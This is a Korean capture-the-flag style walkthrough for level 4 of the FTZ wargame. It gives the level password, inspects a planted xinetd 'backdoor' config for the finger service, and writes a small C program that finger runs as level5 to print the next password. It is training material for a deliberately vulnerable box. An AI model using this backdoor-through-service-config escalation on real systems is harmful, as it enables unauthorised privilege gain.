---
sort: 4
---

# Level 4

```note
id : level4

password : suck my brain
```

```bash
[level4@ftz level4]$ cat hint

누군가 /etc/xinetd.d/에 백도어를 심어놓았다.!
```

xinetd.d에는 여러가지 서비스 설정파일들이 존재한다.<br>
일단 뭐가 있는지 궁금하니 가서 살펴보자.

```bash
[level4@ftz level4]$ cd /etc/xinetd.d
[level4@ftz xinetd.d]$ ls -al
total 88
drwxr-xr-x    2 root     root         4096 Sep 10  2011 .
drwxr-xr-x   52 root     root         4096 Jan  7 18:41 ..
-r--r--r--    1 root     level4        171 Sep 10  2011 backdoor
-rw-r--r--    1 root     root          560 Dec 19  2007 chargen
-rw-r--r--    1 root     root          580 Dec 19  2007 chargen-udp
```

대놓고 backdoor라고 적혀있다.<br>
뭐라고 적혀있는지 살펴보자.

```bash
[level4@ftz xinetd.d]$ cat backdoor
service finger 
{
	disable	= no
	flags		= REUSE
	socket_type	= stream        
	wait		= no
	user		= level5
	server		= /home/level4/tmp/backdoor
	log_on_failure	+= USERID
}
```

finger는 사용자 계정 정보와 최근 로그인 정보, 이메일, 예약 작업 정보 등을 볼 수 있도록 하는 것이다.<br>
level5 유저가 사용할 경우 /home/level4/tmp/backdoor를 실행시키는 것으로 여겨진다. 그러나 해당 파일이 존재하지 않는다.<br>
따라서 level5의 비밀번호를 뱉어내는 backdoor를 직접 만들어내고 finger를 통해 실행시켜야한다.

```c
// /home/level4/tmp/backdoor.c
// gcc -o backdoor backdoor.c

#include <unistd.h>

int main(void)
{
	system("my-pass");
	return 0;
}
```

이제 finger를 실행시켜서 backdoor를 실행시키면 된다.<br>
finger를 그냥 실행시키면 level5유저로써 사용되지 않기 때문에 아래와 같이 remote형태로 사용해야한다.

```bash
[level4@ftz tmp]$ finger level5@localhost
```

```tip
## 알게 된 점

xinetd.d에는 서비스 설정 파일들이 존재한다.

finger 서비스
```